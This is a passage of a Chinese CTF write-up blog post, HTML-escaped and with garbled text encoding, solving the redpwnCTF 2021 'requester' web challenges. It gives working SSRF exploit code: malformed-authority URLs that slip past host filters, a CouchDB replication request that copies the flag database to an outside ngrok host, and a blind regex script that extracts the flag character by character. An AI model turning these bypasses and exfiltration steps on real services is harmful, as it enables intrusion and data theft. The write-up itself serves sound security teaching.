&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;url&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;http://neptunian:neptunian@couchdb:5984@couchdb:5984/neptunian&amp;#39;&lt;/span>&lt;span style="color:#111">),&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;method&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;POST&amp;#39;&lt;/span>&lt;span style="color:#111">),&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;data&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">json&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">({&lt;/span>
&lt;span style="color:#d88200">&amp;#34;some_int&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;some_string&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;c&amp;#34;&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e"># Local&lt;/span>
&lt;span style="color:#111">response&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;http://localhost:8080/testAPI&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">headers&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">headers&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">params&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">params&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">response&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ curl -s http://neptunian:neptunian@couchdb:5984/neptunian/_all_docs &lt;span style="color:#111">|&lt;/span> jq
&lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;total_rows&amp;#34;&lt;/span>: 2,
&lt;span style="color:#d88200">&amp;#34;offset&amp;#34;&lt;/span>: 0,
&lt;span style="color:#d88200">&amp;#34;rows&amp;#34;&lt;/span>: &lt;span style="color:#f92672">[&lt;/span>
&lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;id&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;99ea668366ac9d5d74fd2bc91c00ed5b&amp;#34;&lt;/span>,
&lt;span style="color:#d88200">&amp;#34;key&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;99ea668366ac9d5d74fd2bc91c00ed5b&amp;#34;&lt;/span>,
&lt;span style="color:#d88200">&amp;#34;value&amp;#34;&lt;/span>: &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;rev&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;1-cee1919fc2eda9a6068ed2792608a9dd&amp;#34;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>,
&lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;id&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;99ea668366ac9d5d74fd2bc91c00fd09&amp;#34;&lt;/span>,
&lt;span style="color:#d88200">&amp;#34;key&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;99ea668366ac9d5d74fd2bc91c00fd09&amp;#34;&lt;/span>,
&lt;span style="color:#d88200">&amp;#34;value&amp;#34;&lt;/span>: &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;rev&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;1-f8744c7d9e172ac4b188fbb8f337a204&amp;#34;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">]&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e"># There is a new ID 99ea668366ac9d5d74fd2bc91c00fd09!&lt;/span>
$ curl -s http://neptunian:neptunian@couchdb:5984/neptunian/99ea668366ac9d5d74fd2bc91c00fd09 &lt;span style="color:#111">|&lt;/span> jq
&lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;_id&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;99ea668366ac9d5d74fd2bc91c00fd09&amp;#34;&lt;/span>,
&lt;span style="color:#d88200">&amp;#34;_rev&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;1-f8744c7d9e172ac4b188fbb8f337a204&amp;#34;&lt;/span>,
&lt;span style="color:#d88200">&amp;#34;some_int&amp;#34;&lt;/span>: 1,
&lt;span style="color:#d88200">&amp;#34;some_string&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;c&amp;#34;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Ë∂≥‰ª•ËØÅÊòéÊàë‰ª¨Ëá™Â∑±ÊûÑÈÄ†ÁöÑÂ∏¶testAPIÁöÑÁºùÂêàÊÄ™ÊòØÂèØ‰ª•Ê≠£Â∏∏ÊâßË°åcouchdbÁõ∏ÂÖ≥ÁöÑÂ¢ûÂà†Êü•ÊîπÂäüËÉΩÁöÑ&lt;/p>
&lt;p>ËÄåÈáçË¶ÅÁöÑÊòØËøúÁ®ã‰πüËÉΩÊâìÈÄöÔºåËøôÈáåÊúâËøô‰πà‰∏™Â•Ω‰∏úË•øhttps://docs.couchdb.org/en/3.1.1/replication/replicator.htmlÔºåÊàë‰ª¨Âè™ÈúÄË¶ÅÊûÑÈÄ†‰∏ÄÁªÑpostÊï∞ÊçÆÂ∞±ÂèØ‰ª•ËøúÁ®ãÂæóÂà∞‰∏Ä‰ªΩÊï∞ÊçÆÔºÅ&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-json" data-lang="json">&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#f92672">&amp;#34;source&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;source_db_name&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#f92672">&amp;#34;target&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://dest_user:dest_password@destination_host/dest_database&amp;#34;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Ëá≥‰∫éÂÅöÊ≥ïÂ∞±ÂæàÁÆÄÂçï‰∫ÜÔºöÂÖàÁî®ngrokÊêû‰∏Ä‰∏™ÁΩë‰∏äÂèØËÆøÈóÆÁöÑcouchdbÔºåÂæóÂà∞‰∏¥Êó∂ÁöÑurl &lt;a href="https://2d0a4710580a.ngrok.io">https://2d0a4710580a.ngrok.io&lt;/a>ÔºåÂÖàÂàõÂª∫Êï∞ÊçÆÂ∫ìÊù•‰æø‰∫éÊé•Êî∂‰πãÂêéÂ§çÂà∂ÁöÑÊï∞ÊçÆ&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ curl -X PUT https://tempadm:tempadm12@2d0a4710580a.ngrok.io/neptunian_flag
&lt;span style="color:#f92672">{&lt;/span>&lt;span style="color:#d88200">&amp;#34;ok&amp;#34;&lt;/span>:true&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ÁÑ∂ÂêéÂ∞±ÂèØ‰ª•Âà©Áî®replicatorÂíåÁ≤æÂøÉÊûÑÈÄ†ÁöÑjsonÊï∞ÊçÆÂ§ßÊêûÁâπÊêû‰∫ÜÔºÅÂÖàÊú¨Âú∞&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">json&lt;/span>
&lt;span style="color:#111">headers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#d88200">&amp;#39;Accept&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&amp;#39;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75715e"># POST Replication&lt;/span>
&lt;span style="color:#111">params&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;url&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;http://neptunian:neptunian@couchdb:5984@couchdb:5984/_replicate&amp;#39;&lt;/span>&lt;span style="color:#111">),&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;method&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;POST&amp;#39;&lt;/span>&lt;span style="color:#111">),&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;data&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">json&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">({&lt;/span>
&lt;span style="color:#d88200">&amp;#34;source&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;neptunian&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;target&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;https://tempadm:tempadm12@2d0a4710580a.ngrok.io/neptunian_flag&amp;#34;&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e"># response = requests.get(&amp;#39;http://localhost:8080/testAPI&amp;#39;, headers=headers, params=params)&lt;/span>
&lt;span style="color:#111">response&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;https://requester.mc.ax/testAPI&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">headers&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">headers&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">params&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">params&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">response&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ curl -s http://tempadm:tempadm12@couchdb:5984/flagdb/_all_docs &lt;span style="color:#111">|&lt;/span> jq
&lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;total_rows&amp;#34;&lt;/span>: 1,
&lt;span style="color:#d88200">&amp;#34;offset&amp;#34;&lt;/span>: 0,
&lt;span style="color:#d88200">&amp;#34;rows&amp;#34;&lt;/span>: &lt;span style="color:#f92672">[&lt;/span>
&lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;id&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;d139bf6ab1733d779f64e9c6c4026de9&amp;#34;&lt;/span>,
&lt;span style="color:#d88200">&amp;#34;key&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;d139bf6ab1733d779f64e9c6c4026de9&amp;#34;&lt;/span>,
&lt;span style="color:#d88200">&amp;#34;value&amp;#34;&lt;/span>: &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;rev&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;1-4bb8f6dafef84b2d856fe1444f38b0a2&amp;#34;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">]&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
$ curl -s http://tempadm:tempadm12@couchdb:5984/flagdb/d139bf6ab1733d779f64e9c6c4026de9 &lt;span style="color:#111">|&lt;/span> jq
&lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;_id&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;d139bf6ab1733d779f64e9c6c4026de9&amp;#34;&lt;/span>,
&lt;span style="color:#d88200">&amp;#34;_rev&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;1-4bb8f6dafef84b2d856fe1444f38b0a2&amp;#34;&lt;/span>,
&lt;span style="color:#d88200">&amp;#34;flag&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;flag{JaVA_tHE_GrEAteST_WeB_lANguAge_32154}&amp;#34;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Â•ΩËÄ∂ÔºÅÂ§çÂà∂ÊÄ™Â•ΩËÄ∂ÔºÅ&lt;/p>
&lt;p>ËôΩÁÑ∂‰∏äÈù¢ËØ¥‰∫ÜËøô‰πàÂ§öÔºåÂÖ∂ÂÆûÊ†∏ÂøÉÊÄùË∑Ø‰πüÊå∫Ê∏ÖÊô∞ÁöÑÔºåÂ∞±ÊòØÂÖàËÆ§ÁúüÂàÜÊûêÊ∫êÁ†Å ÊâæÂá∫ÊºèÊ¥ûÁÇπÊòØÁî®couchdbÂàõÂª∫Áî®Êà∑Êó∂‰ºöËá™Âä®ÊèíÂÖ•flag Ëøô‰∏™ËøáÁ®ãÊòØ‰ΩøÁî®httpËØ∑Ê±Ç Êàë‰ª¨ÂæàÂÆπÊòìÂ∞±ÂèØ‰ª•ÊûÑÈÄ†‰∏Ä‰∏™urlÂàõÂª∫Áî®Êà∑ ËÆ©flagËøõÂÖ•Ëá™Â∑±ÊéåÊéßÁöÑÊï∞ÊçÆÂ∫ì‰∏≠Ôºå‰πãÂêéÂ∞±ÂèØ‰ª•È°∫ÁïÖÁöÑËøõË°åÊï∞ÊçÆÂ∫ìÁöÑÂ¢ûÂà†Êü•ÊîπÔºõ‰ΩÜÊòØËøôËøòÈúÄË¶ÅÊé•‰∏äÈ¢òÁõÆ‰∏≠ÁªôÂá∫ÁöÑtestAPIÂÖ•Âè£ÊâçË°åÔºåÂèàÁªèËøá‰∏Ä‰∫õÊûÑÈÄ†ÂèØ‰ª•ÊàêÂäüÁºùÂêàÔºõ‰ΩÜÊòØÁî±‰∫éÈ∏°Ë¥ºÁöÑËÆæÁΩÆ testAPIÂ§ÑÁöÑËØ∑Ê±ÇÂè™‰ºöËøîÂõûÊàêÂäüÊàñÂ§±Ë¥•Ôºå‰∏∫‰∫ÜÁ°ÆÂàáÁöÑÂæóÂà∞flagÔºåÊàë‰ª¨Âà©Áî®‰∫ÜcouchdbÁöÑ_replicatorËøô‰∏™Â•Ω‰∏úË•øÊù•ËøõË°å‰∏Ä‰∏™Êï∞ÊçÆÁöÑÂ§çÂà∂ÔºåÂæóÂà∞flag~~~&lt;/p>
&lt;p>‚Äî‚Äî‚Äî‚Äî‰ª•‰∏ãÊòØÁ¨¨‰∫åÁßçËß£Ê≥ï: char-by-char-blind-sqli&lt;/p>
&lt;p>Ê∫êÁ†ÅÁöÑÂàÜÊûê‰∏çÂèòÔºåËøôÊòØÊ†πÊú¨ÔºåÂ∑ÆÂºÇ‰πãÂ§ÑÈ¶ñÂÖàÂú®‰∫éÊûÑÈÄ†urlÊó∂ËøôÈáåÂà©Áî®‰∫ÜcouchdbÁöÑÂè¶‰∏Ä‰∏™Â•Ω‰∏úË•ø_find&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">curl -X POST -H &lt;span style="color:#d88200">&amp;#34;Content-Type: application/json&amp;#34;&lt;/span> &lt;span style="color:#d88200">&amp;#39;http://strellicsquad:12345@couchdb:5984/strellicsquad/_find&amp;#39;&lt;/span> --data &lt;span style="color:#d88200">&amp;#39;{&amp;#34;selector&amp;#34;:{&amp;#34;flag&amp;#34;: {&amp;#34;$regex&amp;#34;: &amp;#34;.*&amp;#34;}}}&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Êú¨Âú∞ÊµãËØïÂèØ‰ª•ÊàêÂäü‰ºöÊòæÂá∫flagÔºõÁ¨¨‰∫å‰∏™Â∑ÆÂºÇÂú®ÁºùÂêàtestAPIÁöÑÊó∂ÂÄôÔºåÁî±‰∫éfilterÂØπ‰∫éÂ§ßÂ∞èÂÜô‰∏çÂ§™ÊïèÊÑüÔºåÊâÄ‰ª•Â§ßÂÜôCouchÊù•ÁªïËøá‰∫ÜÔºõÂêåÊ†∑Èù¢‰∏¥ÂõûÊòæÂè™ÊúâÊàêÂäüÊàñÂ§±Ë¥• ‰ΩÜÊòØchar-by-char-blind-sqliÊó†ÊâÄÁïèÊÉß~&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">urllib.parse&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">json&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">string&lt;/span>
&lt;span style="color:#75715e"># first, make a request to&lt;/span>
&lt;span style="color:#75715e"># /createUser?username=strellicsquad&amp;amp;password=12345&lt;/span>
&lt;span style="color:#111">alphabet&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;etoanihsrdlucgwyfmpbkvjxqz&lt;/span>&lt;span style="color:#d88200">{}&lt;/span>&lt;span style="color:#d88200">_01234567890ETOANIHSRDLUCGWYFMPBKVJXQZ&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">test_regex&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">regex&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://strellicsquad:12345@Couchdb:5984/strellicsquad/_find&amp;#34;&lt;/span>
&lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">json&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">({&lt;/span>&lt;span style="color:#d88200">&amp;#34;selector&amp;#34;&lt;/span>&lt;span style="color:#111">:{&lt;/span>&lt;span style="color:#d88200">&amp;#34;flag&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#34;$regex&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">regex&lt;/span>&lt;span style="color:#111">}}})&lt;/span>
&lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#34;https://requester.mc.ax/testAPI/?url=&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">urllib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">parse&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">quote&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;amp;method=POST&amp;amp;data=&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">urllib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">parse&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">quote&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;Something went wrong&amp;#34;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>
&lt;span style="color:#111">flag&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;flag{&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">endswith&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;}&amp;#34;&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">alphabet&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">check&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;^&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">flag&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;.*&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">test_regex&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">check&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#34;found &lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">c&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200"> -&amp;gt; &lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#d88200">}{&lt;/span>&lt;span style="color:#111">c&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">flag&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#111">c&lt;/span>
&lt;span style="color:#00a8c8">break&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>‰πüÂèØ‰ª•Êãøflag~~ flag{JaVA_tHE_GrEAteST_WeB_lANguAge_32154}&lt;/p>
&lt;p>‚Äî‚Äî‚Äî‚ÄîÊúÄÊÇ≤ÂÇ¨ÁöÑËé´Ëøá‰∫é‰πãÂêéÊàë‰πüÁî®dockerÂú®Êú¨Âú∞Ëµ∑‰∫Ü‰∏Ä‰∏™ÁéØÂ¢É ‰ΩÜÊòØÂàùÂßãÂåñÊúâÈóÆÈ¢òÔºåÂØºËá¥localhost:5984Êó†Ê≥ïËÆøÈóÆ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210720093017634.png" alt="image-20210720093017634">&lt;/p>
&lt;p>ÊàëÊêú‰∫Ü‰∏Ä‰∏ã ÊúâÁõ∏ÂÖ≥ÈóÆÈ¢òÁöÑËß£Á≠î ‰ΩÜÈÉΩ‰∏çÊòéÁ°Æ‚Ä¶‚Ä¶&lt;/p>
&lt;p>‰ªéËøô‰∏™Êä•ÈîôÁúã Â∫îËØ•ÊòØËØ¥È¢òÁõÆÁõ∏ÂÖ≥ÁöÑÈúÄË¶ÅÁöÑdatabase_does_not_existÔºå‰ΩÜÊòØÁî®‰∫éÂàùÂßãÂåñÁöÑ/_utils‰πüÊó†Ê≥ïËÆøÈóÆÔºåÁõ¥Êé•&lt;code>curl 127.0.0.1:5984&lt;/code>‰πüÊòØÂ§±Ë¥•Ôºå&lt;code>curl couchdb:5984&lt;/code>‰πüÊòØÂ§±Ë¥•ÔºåÂ§ÑÁêÜÊä•ÈîôÁúüÊòØÂøÉÁ¥Ø&lt;/p>
&lt;h2 id="webrequester-strikes-back">web/requester-strikes-back&lt;/h2>
&lt;blockquote>
&lt;p>Java was found to not be the future. Can you take down requester again?&lt;/p>
&lt;/blockquote>
&lt;p>Ê∫êÁ†ÅÂ§ÑÊúâ‰∏ÄÂ§Ñ‰øÆÊîπ&lt;code>if (urlURI.getHost().toLowerCase().contains(&amp;quot;couchdb&amp;quot;))&lt;/code>&lt;/p>
&lt;p>Ëøô‰ΩøÂæóÊàë‰ª¨‰∏çËÉΩÁî®‰πãÂâçÁöÑCouchdbÂ§ßÂÜôÁöÑÊñπÂºèÊù•ÁªïËøáÔºå‰ΩÜÊòØ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210806155508706.png" alt="image-20210806155508706">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210806155558838.png" alt="image-20210806155558838">&lt;/p>
&lt;p>ÁªìÂêà&lt;a href="https://mail-archives.apache.org/mod_mbox/hc-commits/202009.mbox/%3C20200930085030.C135C82908@gitbox.apache.org%3E">Incorrect handling of malformed authority component by URIUtils#extractHost&lt;/a>&lt;/p>
&lt;p>Êàë‰ª¨Âè™ÈúÄË¶ÅÊää‰πãÂâçÁöÑurlÊîπÊàê&lt;code>http://strellicsquad:12345@couchdb:5984@pepegaclapwr/strellicsquad/_find&lt;/code>Âç≥ÂèØÔºàËß£Ê≥ï‰∫åÔºâ&lt;/p>
&lt;p>Ëß£Ê≥ï‰∏ÄÁõ¥Êé•Ë∑ëÂ∞±Ë°å ‰∏ÄÊ†∑ËÉΩÈÄö&lt;/p>
&lt;p>Áõ∏ÂÖ≥ÁöÑ‰∏Ä‰∫õssrfÂâçÁΩÆÁü•ËØÜ&amp;amp;urlËß£ÊûêÈóÆÈ¢ò‰ªçÁÑ∂ÂèØ‰ª•ÁúãËøôÈáåÔºö&lt;a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf">A New Era of SSRF - Exploiting URL Parser in Trending Programming Languages! - üçäOrange Tsai&lt;/a>ÔºàÂ•ΩÂéâÂÆ≥ÁöÑpptÔºâ&lt;/p>
&lt;p>ÂèÇËÄÉÔºö&lt;a href="https://fireshellsecurity.team/redpwnctf-requester-and-requester-strikes-back/#requester-strikes-back">wp1&lt;/a> &lt;a href="https://cor.team/posts/redpwnCTF%202021%20-%20web%20challenges#requester-strikes-back">wp2&lt;/a>&lt;/p>
